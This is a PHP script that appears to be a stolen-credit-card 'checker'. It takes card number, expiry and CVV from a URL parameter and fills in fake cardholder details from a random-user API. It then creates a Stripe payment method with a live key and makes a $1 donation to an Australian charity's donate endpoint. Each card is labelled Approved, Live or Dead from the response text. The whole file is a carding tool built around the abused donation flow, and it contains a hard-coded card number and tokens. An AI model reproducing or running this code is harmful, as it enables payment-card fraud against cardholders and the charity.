<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/
$ch = curl_init('');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card%5Bnumber%5D=5228196005871893&card%5Bcvc%5D=045&card%5Bexp_month%5D=09
&card%5Bexp_year%5D=2026&guid=e811dd65-f77a-4d92-97af-5fc44c463f152bc9d5
&muid=542b680a-468a-4f24-9553-17bef403e37da34437&sid=3b26e3bf-0dd0-492d-97ae-0e5cefc304bc3c3aa5
&payment_user_agent=stripe.js%2F37ee740de7%3B+stripe-js-v3%2F37ee740de7%3B+split-card-element&referrer=https%3A%2F%2Fthp.org
&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_16YznRBZvFhgYn3v&_stripe_version=2023-10-16
&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiTVo0TjhWN0ZzeFRaamc1Y2IyYVZSRlBjMnc5WGMyaHY5RHNsdWk5NC9jdnpMTXFuUjZxK0xRKy9ya2VqQjdhZk5GRG1xKzA4blJvcStvUHVnR2Fya3hpdmgzc1lnNzByd3drVHdQSUl3dDgwOXhyQWFBcnNHc3lVV21CYUFJSEVxUHpPZVhjNFZ2V2pMVTVERHFjZHJlbHJqeUF1K1N0MEs0Z1FqcUt2UFZ6OU93L2RWT3lLc2cvcW9RUWd3YkpHaFZxOWhGT0twOWczeTNPQUgvVWhHeHYzU0syZ0NVM2J2cnZRblFjUjdCajdIWTF4SmxEai81aktwUTY1RnZ5cUFMQzFZRlNybEpTMW9VQXhxNTdXbkdkNDJwTGltRVNMTm9janpZTWU0NjhIbVNlZnF5bmYxUVdRazA0cWZZZjFlL3QvTTVoSXdjUXN0dElIQVQ3SXpUVFQ1OHNjbkZpYldMR0lMVmNYM21OakdMMFJCYlQ3RFMySlJieGtHVXVZVUFveGtDc3N6cm1DUTQra2NLTVpyYVJ6M24vZ2EreER1WlFTSVNSKzFZVGNBY3ViU0xRSkFFV2lvTkdLcVNKc0M3Rks2NzVxc1ZWTHZhV21QQXRNbDl0OXJVRDNPQU9rTE9pOGUyWUNSZGdpYzZJcVFTR212ZC80U282cEhkd2FKelRVNDY5aGlpOFA2RHFkbHVBR0JqUWQzZEM0aHlIelhEVmRPa3QvL2ZFTW9YbmNCVlZlUm1GcnY0Y1lOZnE0TndrQkJ2T1I4eFpDRUQxemFLRnVTNVUxNlJDcEE2a2JCL2diTTRxSjlkKzE1bXZ0RXUrNUxHUUd2RCtNWTBWeUFJRXkxVGsrVmo4NXVEemZWR0htN2dHb3lNRHpLRzAzZmRhRmpYQ3FyMnU5QlRFVzNJMlh4TVNxb2tVb0V3N2lBWU9mTm5aWWk4T05mTDdYMDZOeDczVUZaeGJEK2FORjVWVWVtbmszMXd3SWQvV2pFR1FsUjRIZUxQM3Q2LzZlNGFtVllDazJzTjNIU0ZtRStqcmRCU3lMa0FHcHp4NXZieG1GTGNtSTM0WUJjZURMRFJ0ZjMzMXUwdngvSlRCQWZ6VFhSS1Y5SDQzcmp3aHByU1hmZnFvdk1UMjkyUlUwaXNHQncrMU13MTh2bWZvbmdtS1R3MlNDRWlLckQ5TzBEZFNVOUdTQkNmZ3Z2T3kwVHE3dWRjTERjd28wUEpoTzhQdnVUWE1jdjVhdnY0c3lESjJveDczOEVsb2c0UmovYTB2SmFPeGtWc2YvcTF6cHJiV2xkTWEwTEZLamFIYnNHdEZVNTljK0J0a3lKdXBuYWJHNGlNUGd2Zy9tRXhNdDB2VFZFVVJJMFd6QUZKRTZpT2xhSU5TL1diMDA4eVY3L2JuWTh0RllyZW1IbTNvWW9BbVM1MEx5SlRyaTFscjhjOVRtcndhamhYSjNneWkwTW5NYnFmclFuWUh5cm9OYWhSTk1YODN5TWJDSXlKakdUdUpUWnN2a001ZGpYY2dtRHE4NnlaRFIrRk0zU05RVW0weEp0TkprVzlxL3IwWWFYWUYzR3FldERyQ2Y1UmwrdU5VdVd6RkFReDdtbmprMDBlYzFiQUhLYWV4Y2VQWk1DUGV1eU9KOUhVY3V0M3N3a2xTN1NDYTRjcFpWeU1uWC9oanZodzI2aUVVdjhkNWMwSXIvc1BJdWlmQ2M1TVd3UGFGTFkxNlIwck1uWGVhbXFSeFhXZjdqT0JLV3hwNUMyZWV1Tmx4elBqcGlmaWtjdkJXMmw4T3NibFdIaTdlY0pDUGFzMUxVVDN4VVZUekROdHN3RXZSb3p2dDdMWWpOdlFpbk1VZEpGWWpxL0NtQ3puRUZQdnFrSFhRTXJadEFXSnAyOXUrbXRPd2w1YUMvWXpwMHArRktDZnBQUHhiTG5hUXU5NzlPT2hvbUJnS09IV0h0akxRVy9EQjdBaUVoOCtZdnpKMEYrN2dLbnZxQXFVYXdkczlJUjdQZG1uRFdDSFBwdHZYTjI3ZGkvRDcrbjFUSURUTytzQTd6VmxXS1RvU0YyWjlRN3hncm9EUGNGdlVIU2RwRE5LMnNpOVY1NVduQ2t3UXBIVFRNc0xNZGxYNlp4QVpZWlZDTFV0SVNKU2FSY1UvSnZ6LzRJRTBPNE1lU1VqbzdUT2tueTNXem9UZEp0ZXNCbC9XczBMQ0VKSmtvb1hWcVF2UGljbHlGVzN6ejFTa0Nzb1VCWlhGSjFlMWhGOEdVTjRFSTdUWkU1NEcyUDBYcWEvSzdYdjlub0E2Z2pZU3AyblNpcTloRHF3VjBFYTJmMFVnNHBGdnkyQXBRdzdzZ3NaeXlpSXlSVXMyam5tT0xpMC9oQnpyckFwMGVPakVXQmxLQWR6K1FFeTB2N3BSUEIxSjdvSmZPMUExWDVHUHJ6eHhBQWhXUDlDcm1mY2FPY2ZKSFUzQWdteU8wRGx1OWhMcEVOZmcvYTZZRU5lSW1SMXB5czFKUHcvZHBUdmY5SkUxUDA4bFQyYm9qTVhRcDE0eHJudFVCcVhGWTJlWjBUT3U0NldWQ2kwbEQ0ZlNhZzBvSE4rbHlmNDMzWUxURnlzZGlBSkZMNFVES3BYZDhIcEgyWkFTd21oYzJjV2ozRUovU0taSSt5RnZoT3Z3TDZDdDJmZDVrajRxb2hwMFErYW5MNjNxNVAzRjIrMFU3NEhydVNqaTJJTk5Gc0wzQ2doaE5VRlB6dThId0lyMjlTV055S0dqeXZWSzZ0ZWZjNlRZWTdqNFBxQmxGcngxQVlFMk9acm82ZEJqd0ZjM1RjU3VMRis1WERId1IxNVhOeUpISUpHOEhLTUpTaTM3K1VuVHpuOUR6WkVjeGM3NnZiREdvajNkcExjeTVVQmQ1Uk91cFpnUzdzZFpiV3Zrb1UrZmdjK0NQYW9kdVgxbmZSYWlIa2MxQXZtUE8wbjFzQUEvVzVWTTRGSldReWFQb0d5QnUxQ0Y2S0pnaFY2ZWliaXVrd0szV2xMVk54bWwveW9EdW01MmJRN295OExLNWRsc0grRUduajl6Q0UzaVFNRUVMa3VtTDNxN1VuSkFZV3ZpYVVsbitHWWFKd0RrRjNpVFp1UzRueFNhejY1cFY0eDdsb3JtY1gvRkx2NlVTZzRqVEROSSthUDQ9IiwiZXhwIjoxNzMxNjUxNTk0LCJzaGFyZF9pZCI6ODMzNDQwODk3LCJrciI6IjI2YzMwZGEzIiwicGQiOjAsImNkYXRhIjoiTElzRkIyakM1Sm1GakVGa2ZMbHcrVHpSZzZOdDBKYU9kY1ZwVHJSa2pJcDdZdExEYkVPdGF6RXNmQkpXbmlGSmQ0cGRIOGd2NzI0QmJQdFJqSGk4eCtmOUV6TC9iK0o1NzlLZmJtc0pJSWMxRjNzNmN2WkFqZS8vYnliRkxtQng0TGRsSVRBU1Zhc2p2Rms5TlB0MlpmZnU0d3hIWmErOXQ3M21SUms4VnBQcHlYb01PcUFTQ0l0TVNGUkFsbUNKcGZGUFNwaHNWNjZtSzAzUyJ9.dAtwHuFQ4JZ910bbCQrlRvt1UNXkYCw-rIJk9BhaWZU');

$c = curl_exec($ch);

$token = trim(strip_tags(getstr($c,'id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mercy-stripe.xct01.com/donate.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Content-Type: text/plain;charset=UTF-8',
'Origin: https://romero.mercycommunity.org.au',
'Referer: https://romero.mercycommunity.org.au/donate/',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"'.$token.'","description":"Romero Centre - $1 Gift"}');
$a = curl_exec($ch);
$message = trim(strip_tags(getstr(a,'"message":"','"')));
// Check if both card and CVV are approved
if (strpos($a, "Everything matches, card and CVV approved.") || strpos($c, "Everything matches, card and CVV approved.")) {
  echo '<div style="padding: 10px; background-color: #28a745; color: white; border-radius: 5px; margin-bottom: 10px;">
          <span class="badge badge-success">#Approved</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' 
          <b style="color: #ffffff;"> 💳 Approved 💳 '.$bin.'('.$banco.'-'.$nivel.') ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>
        </div>';
} 
// Check if only the CVV is incorrect, but the card is valid
else if (strpos($a, "Your card's security code is incorrect.") || strpos($c, "Your card's security code is incorrect.")) {
  echo '<div style="padding: 10px; background-color: #ffc107; color: black; border-radius: 5px; margin-bottom: 10px;">
          <span class="badge badge-warning">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' 
          <b style="color: #ffffff;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.') ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>
        </div>';
} 
// Check if the card number is incorrect
else if (strpos($a, "Your card number is incorrect.") || substr_count($c, 'incorrect_number') > 0) {
  echo '<div style="padding: 10px; background-color: #dc3545; color: white; border-radius: 5px; margin-bottom: 10px;">
          <span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' 
          <b> ❌ Invalid ❌  ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛</b>
        </div>';
  exit();
} 
// Check if the card does not support this type of purchase
else if (strpos($a, "Your card does not support this type of purchase.") || strpos($c, "Your card does not support this type of purchase.")) {
  echo '<div style="padding: 10px; background-color: #dc3545; color: white; border-radius: 5px; margin-bottom: 10px;">
          <span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' 
          <b>🔴 Blocked 🔴 '.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>
        </div>';
} 
// Check if the card was declined
else if (strpos($a, "Your card was declined.") || strpos($c, "Your card was declined.")) {
  echo '<div style="padding: 10px; background-color: #dc3545; color: white; border-radius: 5px; margin-bottom: 10px;">
          <span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' 
          <b>🔴 Dead 🔴 '.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>
        </div>';
} 
// Default response for unknown rejection
else {
  echo '<div style="padding: 10px; background-color: #6c757d; color: white; border-radius: 5px; margin-bottom: 10px;">
          <span class="badge badge-secondary">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' 
          <b>🔴 Unknown 🔴 '.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>
        </div>';
}



?>